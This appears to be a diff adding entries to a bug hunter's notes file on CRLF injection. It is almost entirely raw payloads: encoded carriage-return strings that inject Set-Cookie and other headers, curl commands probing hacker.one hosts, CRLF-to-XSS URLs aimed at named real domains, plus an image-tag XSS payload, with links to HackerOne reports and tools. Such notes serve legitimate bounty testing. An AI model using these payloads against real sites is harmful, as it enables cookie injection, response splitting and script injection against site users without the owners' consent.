@@ -1,3 +1,34 @@
+https://h1.security.nathan.sx/
+
+%0D%0ASet-Cookie:crlfinjection=crlfinjection
+%0d%0a%09headername:%20headervalue
+%E5%98%8A%E5%98%8DSet-Cookie:%20test
+%0aSet-Cookie:malicious_cookie1
+%0d%0a%20InjectedBy:LipSec
+
+$ curl -I -L http://info.hacker.one/%0d%0a%09headername:%20headervalue
+$ curl -I http://info.hacker.one/%0d%0a%09X-Powered-By:%20headervalue
+$ curl -I -L http://info.hacker.one/%0d%0a%09Location:%20http%3A%2F%2Fgoogle.com
+$ curl -I http://info.hacker.one/%0d%0a%09foo:bar
+
+HTTP Response Splitting (CRLF injection) due to headers overflow
+https://hackerone.com/reports/53843
+CRLF Injection to XSS
+https://hackerone.com/reports/192667
+
+https://team.badoo.com/%0d%0adata:text/html;text,%3Csvg%2fonload%3Dprompt%281%29%3E
+http://account-global.ubnt.com/%3f%0dSet-Cookie:crlf=injection%3bdomain=.ubnt.com%3b
+https://hackerone.com/reports/191380
+https://hackerone.com/reports/192749
+
+POC: https://youtu.be/w41mN2kTD9E
+Tool: https://github.com/karthi-the-hacker/crlfi
+
+Details: https://joshuaprovoste.com/crlf-injection-payloads/
+
+
+https://gowthams.gitbook.io/bughunter-handbook/hackerone-reports
+https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
 https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/refs/heads/main/chaos-bugbounty-list.json
 
 "><img src=x onerror=alert(document.domain)>
